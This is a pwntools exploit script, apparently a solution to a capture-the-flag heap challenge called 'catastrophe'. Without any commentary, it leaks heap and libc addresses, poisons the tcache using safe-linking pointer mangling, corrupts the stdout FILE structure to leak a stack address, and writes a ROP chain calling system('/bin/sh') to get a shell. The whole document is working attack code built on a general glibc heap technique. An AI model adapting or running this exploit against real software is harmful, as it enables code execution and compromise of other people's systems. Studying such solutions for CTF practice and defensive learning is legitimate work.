#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('catastrophe_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def malloc(idx, size, content):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"?", str(idx).encode())
    io.sendlineafter(b"?", str(size).encode())
    io.sendlineafter(b":", content)

def free(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"?", str(idx).encode())

def view(idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"?", str(idx).encode())
    io.recvuntil(b"> ")
    data = io.recvline().strip(b"\n")
    return u64(data.ljust(8, b"\x00"))

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val 


def solve():

    for i in range(9):
        malloc(i, 0x100, b"A")

    malloc(9, 0x10, b"B")

    for i in range(7):
        free(i)
    
    free(8)
    free(7)

    heap_base = view(0) << 12
    libc.address = view(8) - 0x219ce0
    info("heap base: %#x", heap_base)
    info("libc base: %#x", libc.address)

    malloc(0, 0x100, b"junk")
    free(8)

    environ = libc.sym["environ"]
    stdout = libc.sym["_IO_2_1_stdout_"]
    tcache_next = mangle(heap_base, stdout)

    malloc(1, 0x130, b"A"*0x100 + p64(0) + p64(0x111) + p64(tcache_next))
    malloc(2, 0x100, b"pew")
    malloc(3, 0x100,
        p64(0xfbad1800) + # _flags
        p64(environ)*3 + # _IO_read_*
        p64(environ) + # _IO_write_base
        p64(environ + 0x8)*2 + # _IO_write_ptr + _IO_write_end
        p64(environ + 8) + # _IO_buf_base
        p64(environ + 8) # _IO_buf_end
    )

    io.recvuntil(b" ")
    stack = u64(io.recv(8)) - 0x130 - 8
    info("stack: %#x", stack)

    free(8)
    free(1)

    rop = ROP(libc)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    sh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]

    ropchain = flat(
        [
            b"A"*8,
            pop_rdi,
            sh,
            ret,
            system
        ]
    )

    tcache_next = mangle(heap_base, stack)

    malloc(4, 0x130, b"A"*0x100 + p64(0) + p64(0x111) + p64(tcache_next))
    malloc(2, 0x100, b"pew")
    malloc(0, 0x100, ropchain)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

